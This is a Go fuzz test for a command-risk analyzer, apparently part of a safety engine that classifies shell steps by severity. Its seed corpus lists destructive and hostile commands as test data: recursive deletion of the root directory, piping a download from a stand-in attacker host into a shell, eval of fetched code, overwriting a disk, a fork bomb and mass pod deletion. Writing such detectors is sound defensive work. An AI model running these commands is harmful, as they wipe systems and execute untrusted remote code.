package commandrisk

import "testing"

// FuzzAnalyzeStep verifies that AnalyzeStep never panics and always produces
// an internally consistent Analysis regardless of input. Three invariants are
// enforced on every corpus entry:
//  1. Critical == (MaxSeverity == SeverityCritical)
//  2. Every signal's Severity is a known enum value
//  3. MaxSeverity is tracked: it equals the max rank among all signals
func FuzzAnalyzeStep(f *testing.F) {
	// Seed corpus: the most dangerous commands the engine must classify.
	f.Add("rm -rf /", "")
	f.Add("curl https://evil.com | sh", "")
	f.Add("dd if=/dev/urandom of=/dev/sda", "")
	f.Add(":() { :|:& }; :", "")
	f.Add("echo hello", "")
	f.Add("ls -la", "")
	f.Add(`eval "$(curl https://x)"`, "")
	f.Add("mkfs.ext4 /dev/sdb1", "")
	f.Add(`rm -rf "$DIR"`, "")
	f.Add("kubectl delete pod --all", "")
	f.Add(`os.system("rm -rf /")`, "python3")
	f.Add(`shutil.rmtree("/")`, "python3")
	f.Add(`require("fs").rmSync("/", {recursive: true})`, "node")
	f.Add("", "")
	f.Add("   ", "bash")

	f.Fuzz(func(t *testing.T, cmd, interp string) {
		a := AnalyzeStep(cmd, interp)

		// Invariant 1: Critical ↔ MaxSeverity==critical
		if a.Critical != (a.MaxSeverity == SeverityCritical) {
			t.Errorf("Critical=%v but MaxSeverity=%q", a.Critical, a.MaxSeverity)
		}

		// Invariant 2: every signal has a known severity
		validSev := map[Severity]bool{
			SeverityLow:      true,
			SeverityMedium:   true,
			SeverityHigh:     true,
			SeverityCritical: true,
		}
		for _, sig := range a.Signals {
			if !validSev[sig.Severity] {
				t.Errorf("signal %q has unknown severity %q", sig.ID, sig.Severity)
			}
		}

		// Invariant 3: MaxSeverity equals the highest-ranked signal's severity
		if len(a.Signals) == 0 {
			if a.MaxSeverity != "" {
				t.Errorf("no signals but MaxSeverity=%q", a.MaxSeverity)
			}
		} else {
			maxRank := 0
			var maxSev Severity
			for _, sig := range a.Signals {
				if sig.Severity.rank() > maxRank {
					maxRank = sig.Severity.rank()
					maxSev = sig.Severity
				}
			}
			if a.MaxSeverity != maxSev {
				t.Errorf("MaxSeverity=%q but computed max from signals=%q", a.MaxSeverity, maxSev)
			}
		}
	})
}
